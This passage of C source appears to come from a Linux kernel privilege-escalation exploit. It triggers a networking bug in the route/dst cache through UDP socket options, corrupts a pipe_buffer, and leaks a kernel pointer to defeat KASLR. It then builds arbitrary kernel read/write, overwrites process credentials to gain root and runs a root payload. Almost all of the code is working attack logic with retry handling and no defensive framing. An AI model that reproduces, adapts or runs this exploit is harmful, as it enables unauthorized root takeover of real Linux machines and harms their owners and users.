        // will retry exit after failure
        LOG("FAIL: could not corrupt pipe");
        trace_marker("attempt=%lu stage=pipe_corrupt_fail", trace_marker_attempt);

        // close all resources used in exploit
        close_pipe_array(page_pipes, page_pipe_count);

        if (env_usize("BAD_DST_LEAK_VULN_PIPES_ON_FAIL", online_cpu_count() > 1)) {
            LOG("leaking vuln pipes after failed attempt to avoid closing corrupted pipe state");
            remember_leaked_vuln_pipes(vuln_pipes, vuln_pipe_count);
        } else {
            close_pipe_array(vuln_pipes, vuln_pipe_count);
        }
        pipe_set->active = false;
        pipe_set->page_pipes_active = false;
        pipe_set->vuln_pipes_active = false;

        // TODO: remove
        // just for debugging
        // system("/bin/sh");

        // cannot close, it will cause deadlock
        // SYSCHK(close(ctx->vuln_socket));

        return false;
    }

    RwContext rw_context = { 0 };

    // at this point, exploit has succeeded
    rw_context.exp_pipe = corrupt_pipe.pipe;

    LOG("found corrupted pipe FIONREAD source=%s index=%d size=0x%x",
        corrupt_pipe.leaked ? "leaked" : "current",
        corrupt_pipe.index, (unsigned int) corrupt_pipe.size);
    trace_marker("attempt=%lu stage=pipe_corrupt_success source=%s index=%d",
        trace_marker_attempt, corrupt_pipe.leaked ? "leaked" : "current",
        corrupt_pipe.index);

    // This write does not put the bytes in the reclaimed pipe-buffer page.
    // It creates the next pipe_buffer slot there; that valid slot is the probe
    // used to recover the base of the corrupted pipe ring.
    const usize probe_len = 4;
    SYSCHK(write(rw_context.exp_pipe.write_fd, "PWND", probe_len));

    bool exp_page_pipe_found = false;

    u8 page_buffer[0x1000] = { 0 };
    for (usize i = 0; i < page_pipe_count; i++) {
        SYSCHK(read(page_pipes[i].read_fd, page_buffer, sizeof(page_buffer)));

        usize pipe_page_offset = 0;
        usize probe_offset = 0;
        struct pipe_buffer_t pipe_buffer_leak = { 0 };
        if (!find_pipe_buffer_probe(page_buffer, sizeof(page_buffer), probe_len,
                                    active_slots_before_probe,
                                    &pipe_page_offset, &probe_offset,
                                    &pipe_buffer_leak)) {
            continue;
        }

        rw_context.exp_page_pipe = page_pipes[i];
        rw_context.pipe_page_offset = pipe_page_offset;
        rw_context.pipe_buffer_leak = pipe_buffer_leak;

        LOG("pipe probe leak accepted: page_index=%lu probe=0x%lx pipe_base=0x%lx active_before=%lu page=0x%lx ops=0x%lx offset=0x%x len=0x%x flags=0x%lx",
            i,
            probe_offset,
            rw_context.pipe_page_offset,
            active_slots_before_probe,
            rw_context.pipe_buffer_leak.page,
            rw_context.pipe_buffer_leak.ops,
            rw_context.pipe_buffer_leak.offset,
            rw_context.pipe_buffer_leak.len,
            rw_context.pipe_buffer_leak.flag);

        exp_page_pipe_found = true;

        // Refill pipe for setup for read64 and write64.
        SYSCHK(write(rw_context.exp_page_pipe.write_fd, page_buffer, sizeof(page_buffer)));
        break;
    }

    if (!exp_page_pipe_found) {
        LOG("FAIL: corrupted pipe source=%s index=%d had no matching pipe-buffer probe",
            corrupt_pipe.leaked ? "leaked" : "current", corrupt_pipe.index);
        trace_marker("attempt=%lu stage=pipe_page_probe_fail source=%s index=%d",
            trace_marker_attempt, corrupt_pipe.leaked ? "leaked" : "current",
            corrupt_pipe.index);

        if (corrupt_pipe.leaked) {
            ignore_leaked_vuln_pipe_index(corrupt_pipe.index);
        }

        close_pipe_array(page_pipes, page_pipe_count);

        if (env_usize("BAD_DST_LEAK_VULN_PIPES_ON_FAIL", online_cpu_count() > 1)) {
            LOG("leaking vuln pipes after failed attempt to avoid closing corrupted pipe state");
            ssize_t first_leaked = remember_leaked_vuln_pipes(vuln_pipes, vuln_pipe_count);
            if (!corrupt_pipe.leaked && first_leaked >= 0) {
                ignore_leaked_vuln_pipe_index((int) first_leaked + corrupt_pipe.index);
            }
        } else {
            close_pipe_array(vuln_pipes, vuln_pipe_count);
        }
        pipe_set->active = false;
        pipe_set->page_pipes_active = false;
        pipe_set->vuln_pipes_active = false;

        return false;
    }

    global_rw_context = rw_context;

    kaslr_base = rw_context.pipe_buffer_leak.ops - PIPE_OPS_OFFSET;
    LOG("kaslr base: %lx", kaslr_base);

    vmem_base = env_usize("BAD_DST_VMEMMAP_BASE", 0);
    if (vmem_base == 0) {
#ifdef VMEMMAP_START
        vmem_base = VMEMMAP_START;
#else
        vmem_base = rw_context.pipe_buffer_leak.page & 0xfffffffff0000000;
#endif
    }
    LOG("vmemmap base: %lx", vmem_base);

    scan_kernel_phys_base();
    LOG("physical base address: %lx", phys_base);

    linear_base = env_usize("BAD_DST_LINEAR_BASE", 0);
    if (linear_base == 0) {
#ifdef LINEAR_BASE
        linear_base = LINEAR_BASE;
#else
        linear_base = read64_kernel(kaslr_base + PAGE_OFFSET_BASE);
#endif
    }
    LOG("linear base: %lx", linear_base);

    LOG("Arb R/W setup");

    if (env_usize("BAD_DST_GET_ROOT", 1)) {
        if (!get_root()) {
            LOG("FAIL: root credential overwrite failed");
            return false;
        }

        if (env_usize("BAD_DST_RUN_ROOT_PAYLOAD", 1)) {
            root_payload();
        }
    }

    while (1) {
        sleep(1000);
    }

    return true;
}

void test() {
    // ipv6 bug trial
    // int fd = open_connected_ipv6_udp_socket();

    // int mtu = 0;
    // socklen_t mtu_len = sizeof(mtu);
    // LOG("%d", getsockopt(fd, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len));

    // int one = 1;
    // // don't check result, socket might be closed
    // setsockopt(fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));

    // LOG("%d", getsockopt(fd, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len));

    // int fd = open_connected_ipv4_udp_socket();

    // // setting this mode means packets are always sent as non fragmentable
    // int mode = IP_PMTUDISC_DO;
    // SYSCHK(setsockopt(fd, IPPROTO_IP, IP_MTU_DISCOVER, &mode, sizeof(mode)));

    // u8 buf[1400] = { 0 };
    // SYSCHK(send(fd, buf, sizeof(buf), 0));

    for (usize i = 0; i < 16; i++) {
        LOG("test round: %lu", i + 1);
        int fd = open_vuln_ipv4_udp_socket();

        int mtu = 0;
        socklen_t mtu_len = sizeof(mtu);
        LOG("%d", getsockopt(fd, IPPROTO_IP, IP_MTU, &mtu, &mtu_len));

        int one = 1;
        // don't check result, socket might be closed
        setsockopt(fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));

        LOG("%d", getsockopt(fd, IPPROTO_IP, IP_MTU, &mtu, &mtu_len));
    }
}

void test2() {
    LOG("starting test");
    for (usize i = 0; i < 4; i++) {
        LOG("socket: %lu", i);
        int socket_a = socket(AF_INET, SOCK_DGRAM, 0);
        int one = 1;
        SYSCHK(setsockopt(socket_a, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one)));

        struct sockaddr_in bcast = {
            .sin_family = AF_INET,
            .sin_port = htons(6767),
        };
        inet_pton(AF_INET, "192.168.10.255", &bcast.sin_addr);

        SYSCHK(connect(socket_a, (struct sockaddr *)&bcast, sizeof(bcast)));

        send(socket_a, "A", 1, 0);   // populate sk_dst_cache
    }

    // int fd = socket(AF_INET, SOCK_DGRAM, 0);

    // /* Must be done before the bug. First bind is allowed here. */
    // setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, "eth0", 5);

    // struct sockaddr_in sa = {
    //     .sin_family = AF_INET,
    //     .sin_port = htons(31337),
    // };
    // inet_pton(AF_INET, "192.168.1.10", &sa.sin_addr);   /* host's own IPv4 on this VM */

    // SYSCHK(connect(fd, (struct sockaddr *)&sa, sizeof(sa)));
    // send(fd, "A", 1, 0);   /* populate sk_dst_cache */
}

/**
 * Adjusts the soft open file limit.
 * * @param new_limit The requested new soft limit.
 * @return 0 on success, -1 on failure.
 */
int set_soft_file_limit(rlim_t new_limit) {
    struct rlimit rl;

    // Fetch the current limit
    if (getrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Error getting limit: %s\n", strerror(errno));
        return -1;
    }

    printf("Old Soft Limit: %lu\n", (unsigned long)rl.rlim_cur);

    // Update the soft limit
    rl.rlim_cur = new_limit;

    // Apply the new limit
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Error setting soft limit: %s\n", strerror(errno));
        return -1;
    }

    // Verify and log the new limit
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        printf("New Soft Limit: %lu\n", (unsigned long)rl.rlim_cur);
    }

    return 0;
}

/**
 * Adjusts the hard open file limit.
 * Note: Increasing this requires root/superuser privileges.
 * * @param new_limit The requested new hard limit.
 * @return 0 on success, -1 on failure.
 */
int set_hard_file_limit(rlim_t new_limit) {
    struct rlimit rl;

    // Fetch the current limit
    if (getrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Error getting limit: %s\n", strerror(errno));
        return -1;
    }

    printf("Old Hard Limit: %lu\n", (unsigned long)rl.rlim_max);

    // Update the hard limit
    rl.rlim_max = new_limit;

    // Apply the new limit
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        fprintf(stderr, "Error setting hard limit: %s\n", strerror(errno));
        return -1;
    }

    // Verify and log the new limit
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        printf("New Hard Limit: %lu\n", (unsigned long)rl.rlim_max);
    }

    return 0;
}

int main() {
    puts("Starting exploit...");

    set_hard_file_limit(32768);
    set_soft_file_limit(32768);
    system("echo 1 > /proc/sys/net/ipv4/route/mtu_expires");
    pin_irqs_to_cpu0_if_requested();

    // open_vuln_ipv4_udp_socket();
    // for (;;) {}
    // return 0;

    // test2();
    // return 0;

    pin_to_cpu(0);

    trigger_vuln_loop();

    puts("done");

    return 0;
}
